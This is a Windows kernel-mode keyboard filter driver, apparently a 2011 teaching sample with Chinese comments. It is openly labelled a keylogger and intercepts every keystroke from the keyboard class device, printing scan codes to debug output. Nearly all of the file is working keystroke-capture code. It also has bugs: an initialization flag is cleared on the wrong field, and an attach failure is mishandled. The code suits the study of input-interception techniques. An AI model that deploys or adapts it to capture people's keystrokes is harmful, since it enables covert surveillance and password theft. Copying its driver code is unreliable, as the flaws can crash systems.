//
//Description:
//  本程序用于演示基于设备过滤的键盘记录技术。在XP sp3平台上测试通过。
//使用的过滤手段是微软官方提供的设备过滤方法，这种常规的方法一般不用于恶意程序。
//  本代码只用作原理解释使用，请勿作其他用途使用。
//
//Writen By: 宁妖 2011/3/27
//
//Last Write Time: 2011/3/28
//
#include "stdafx.h"

#ifdef __cplusplus
    extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
    unsigned i;

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = KeylogerDefaultHandler;

    //过滤读请求
    DriverObject->MajorFunction[IRP_MJ_READ] = KeylogerRead;
    //处理电源请求
    DriverObject->MajorFunction[IRP_MJ_POWER] = KeylogerPower;
    DriverObject->DriverUnload = KeylogerUnload;
    //安装键盘过滤设备
    HookKbdclassRead(DriverObject);
    return STATUS_SUCCESS;
}

//
//过滤驱动卸载函数
//  需要注意的是，卸载的时候必须保证未决的IRP全部完成或者取消，
//  因为这些IRP被设置了完成例程，若直接卸载驱动，则这些IRP的完成例程
//  的地址无效，会造成蓝屏
void KeylogerUnload(IN PDRIVER_OBJECT DriverObject)
{
    PDEVICE_OBJECT pDevObj;
    LARGE_INTEGER  liDelayTime;
    pDevObj = DriverObject->DeviceObject;

    if (NULL == pDevObj) {
        return ;
    }

    if (NULL == pDevObj->DeviceExtension) {
        return ;
    }

    //从设备栈中解除绑定，这样保证了不会有新的IRP被过滤到，
    //所以只要等待已排入链表的未决IRP完成就可以进行驱动卸载操作了
    if (((PDevExt)pDevObj->DeviceExtension)->pTargetDev->AttachedDevice) {
        IoDetachDevice(((PDevExt)pDevObj->DeviceExtension)->pTargetDev);
    }

    //等待未决的IRP全部完成。这是通过计数实现的。
    //注意，只有用户按键后才会完成这些排队的IRP。
    liDelayTime.QuadPart = -1000000;

    while (((PDevExt)pDevObj->DeviceExtension)->numPendingIrps > 0) {
        KeDelayExecutionThread(KernelMode, FALSE, &liDelayTime);
        KdPrint(("[KeylogerUnload]numPendingIrps: %d\n", ((PDevExt)pDevObj->DeviceExtension)->numPendingIrps));
    }

    //删除过滤设备
    IoDeleteDevice(pDevObj);
    KdPrint(("[KeylogerUnload] Finish\n"));
}

//
//安装一个键盘过滤设备，这样发送给键盘端口驱动的请求都会被
//过滤驱动拦截到。
//
NTSTATUS HookKbdclassRead(PDRIVER_OBJECT DriverObject)
{
    NTSTATUS status;
    PDEVICE_OBJECT pDevObj, pTargetObj;
    PDevExt pDevExt;
    UNICODE_STRING usTargetDevice;
    PFILE_OBJECT pFileObj;

    do {
        //创建一个过滤设备，设备扩展结构是DevExt
        status = IoCreateDevice(DriverObject,
                                sizeof(DevExt),
                                NULL,
                                FILE_DEVICE_KEYBOARD,
                                0,
                                FALSE,
                                &pDevObj);

        if (!NT_SUCCESS(status)) {
            KdPrint(("[HookKbdclassRead]IoCreateDevice Failure!err:0x%08x\n",
                     status));
            break;
        }

        pDevExt = (PDevExt)pDevObj->DeviceExtension;
        //初始化设备扩展结构
        pDevExt->pDrvObj = DriverObject;
        pDevExt->pCurDev = pDevObj;
        pDevExt->numPendingIrps = 0;
        RtlInitUnicodeString(&usTargetDevice, L"\\Device\\KeyboardClass0");
        //获取指定设备名所在设备栈最上层的设备
        status = IoGetDeviceObjectPointer(
                     &usTargetDevice,
                     GENERIC_READ | GENERIC_WRITE,
                     &pFileObj,
                     &pTargetObj
                 );

        if (!NT_SUCCESS(status)) {
            KdPrint(("[HookKbdclassRead]IoGetDeviceObjectPointer Failure!err:0x%08x\n",
                     status));
            IoDeleteDevice(pDevObj);
            break;
        }

        //绑定到目标设备上
        pDevExt->pTargetDev = IoAttachDeviceToDeviceStack(pDevObj, pTargetObj);

        if (NULL == pDevExt->pTargetDev) {
            KdPrint(("[HookKbdclassRead]IoAttachDeviceToDeviceStack Failure!err:0x%08x\n",
                     status));
            IoDeleteDevice(pDevObj);
        }

        KdPrint(("[HookKbdclassRead]pFileObj:0x%08x pTargetObj:0x%08x StackDev:0x%08x\n",
                 pFileObj, pTargetObj, pDevExt->pTargetDev));
        //设置过滤设备的标记，和绑定的设备标记一致
        pDevObj->Flags |= DO_BUFFERED_IO | DO_POWER_PAGABLE;
        pDevObj->ActiveThreadCount &= ~DO_DEVICE_INITIALIZING;
    } while (false);

    return status;
}

//
//默认过滤，直接转发到下层驱动
//
NTSTATUS KeylogerDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
}

//
//过滤读请求，键盘记录就在读请求中
//过滤方法是设置一个完成例程
//
NTSTATUS KeylogerRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    NTSTATUS status;
    KdPrint(("[KeylogerRead] Irp->OriginalFileObject:0x%08x\n",
             Irp->Tail.Overlay.OriginalFileObject));
    IoCopyCurrentIrpStackLocationToNext(Irp);
    IoSetCompletionRoutine(Irp, ReadCompleteRoutine, DeviceObject, TRUE, TRUE, TRUE);
    //增加一个未决的IRP计数，该计数用于卸载本驱动
    ((PDevExt)DeviceObject->DeviceExtension)->numPendingIrps++;
    status = IoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
    KdPrint(("[KeylogerRead] Status:0x%08x Irp.Status:0x%08x\n",
             status, Irp->IoStatus.Status));
    return status;
}

//
//单独处理电源请求，以应对关机、重启等操作。这里只是简单的下发。
//在VISTA以上版本中可以合并到KeylogerDefaultHandler中处理。
//
NTSTATUS KeylogerPower(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    KdPrint(("[KeylogerPower] ==>\n"));
    PoStartNextPowerIrp(Irp);
    IoSkipCurrentIrpStackLocation(Irp);
    return PoCallDriver(((PDevExt)DeviceObject->DeviceExtension)->pTargetDev, Irp);
}

//
//完成例程负责打印出键盘信息
//
NTSTATUS
ReadCompleteRoutine(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp,
    IN PVOID  Context
)
{
    NTSTATUS status;
    PKEYBOARD_INPUT_DATA pKID;
    int iNum, i;
    PDEVICE_OBJECT pFltDevObj = (PDEVICE_OBJECT)Context;
    KdPrint(("[ReadCompleteRoutine] ==>\n"));
    status = Irp->IoStatus.Status;

    if (NT_SUCCESS(status)) {
        //SystemBuffer保存了很多个KEYBOARD_INPUT_DATA结构
        pKID = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        iNum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

        for (i = 0; i < iNum; ++i) {
            switch (pKID->Flags) {
            case KEY_MAKE:
                KdPrint(("\nFlags: KEY_MAKE\n"));
                break;

            case KEY_BREAK:
                KdPrint(("Flags: KEY_BREAK\n"));
                break;
            }

            KdPrint(("MakeCode: %x\n", pKID->MakeCode));
            pKID++;
        }
    }

    if (Irp->PendingReturned)
        IoMarkIrpPending(Irp);

    ((PDevExt)pFltDevObj->DeviceExtension)->numPendingIrps--;
    KdPrint(("[ReadCompleteRoutine] <==\n"));
    return status;
}